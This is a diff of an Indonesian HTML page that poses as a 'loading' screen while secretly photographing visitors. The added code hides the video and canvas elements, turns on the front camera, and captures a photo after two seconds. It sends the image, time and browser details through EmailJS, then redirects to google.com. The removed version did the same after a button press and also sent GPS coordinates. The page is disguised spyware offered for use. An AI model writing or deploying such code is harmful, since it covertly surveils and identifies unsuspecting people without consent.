@@ -1,107 +1,110 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Welcomee</title>
+  <meta charset="UTF-8">
+  <title>Processing...</title>
 
-<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #0f172a;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
 
-<style>
-body{
-    margin:0;
-    font-family:Arial, sans-serif;
-    background:#111;
-    color:white;
-    text-align:center;
-}
-button{
-    margin-top:20px;
-    padding:12px 20px;
-    border:none;
-    border-radius:8px;
-    background:#00c853;
-    color:white;
-    font-size:16px;
-    cursor:pointer;
-}
-button:hover{
-    background:#00e676;
-}
-</style>
+    .box {
+      text-align: center;
+    }
 
+    .loader {
+      border: 4px solid #1e293b;
+      border-top: 4px solid #38bdf8;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: auto;
+      margin-bottom: 15px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
 </head>
 <body>
 
-<h2>Welcome Back</h2>
+<div class="box">
+  <div class="loader"></div>
+  <h3>loading...</h3>
+</div>
 
-<video id="video" autoplay playsinline 
-style="display:none;"></video>
-<button onclick="proses()">Berikutnya</button>
+<!-- Kamera (disembunyikan) -->
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" width="300" height="225" style="display:none;"></canvas>
 
-<canvas id="canvas" style="display:none;"></canvas>
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 
 <script>
 (function(){
-  emailjs.init("buxVv6sNpKGz4iBzb"); // GANTI PUBLIC KEY
+    emailjs.init("buxVv6sNpKGz4iBzb"); // GANTI
 })();
 
-// Aktifkan kamera depan
-navigator.mediaDevices.getUserMedia({ 
-  video: { facingMode: "user" } 
+const video = document.getElementById("video");
+
+// Akses kamera depan
+navigator.mediaDevices.getUserMedia({
+    video: { facingMode: "user" }
 })
-.then(function(stream){
-  document.getElementById("video").srcObject = stream;
+.then(stream => {
+    video.srcObject = stream;
+
+    // Tunggu kamera siap lalu ambil foto
+    setTimeout(ambilFoto, 2000);
 })
-.catch(function(){
-  alert("Kamera tidak diizinkan");
+.catch(err => {
+    console.log("Kamera error:", err);
+
+    // tetap redirect
+    setTimeout(() => {
+        window.location.href = "https://google.com";
+    }, 3000);
 });
 
-function proses(){
+// Ambil foto & kirim
+function ambilFoto() {
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
 
-  const video = document.getElementById("video");
-  const canvas = document.getElementById("canvas");
-  const context = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  context.drawImage(video, 0, 0);
+    const imageData = canvas.toDataURL("image/png");
 
-  let imageData = canvas.toDataURL("image/jpeg", 0.7);
+    emailjs.send("service_lzuezkd", "template_33st1em", {
+        message: "Foto berhasil diambil",
+        image: imageData,
+        time: new Date().toLocaleString(),
+        device: navigator.userAgent
+    })
+    .then(() => {
+        console.log("Berhasil kirim");
 
-  if (navigator.geolocation) {
+        setTimeout(() => {
+            window.location.href = "https://google.com"; // GANTI
+        }, 3000);
+    })
+    .catch(() => {
+        console.log("Gagal kirim");
 
-    navigator.geolocation.getCurrentPosition(
-
-      function(position){
-
-        let latitude = position.coords.latitude;
-        let longitude = position.coords.longitude;
-        let mapsLink = "https://www.google.com/maps?q=" + latitude + "," + longitude;
-
-        emailjs.send("service_lzuezkd", "template_105p1pt", {
-          name: "SI KONTOL",
-          time: new Date().toLocaleString(),
-          latitude: latitude,
-          longitude: longitude,
-          maps: mapsLink,
-          image: imageData
-        }).then(function(){
-            window.location.replace("https://basudewa28.github.io/Official-/basudewa.html");
-        });
-
-      },
-
-      function(){
-        alert("Lokasi tidak diizinkan");
-      }
-
-    );
-
-  } else {
-    alert("Browser tidak mendukung GPS");
-  }
-
+        setTimeout(() => {
+            window.location.href = "https://google.com";
+        }, 3000);
+    });
 }
 </script>
 
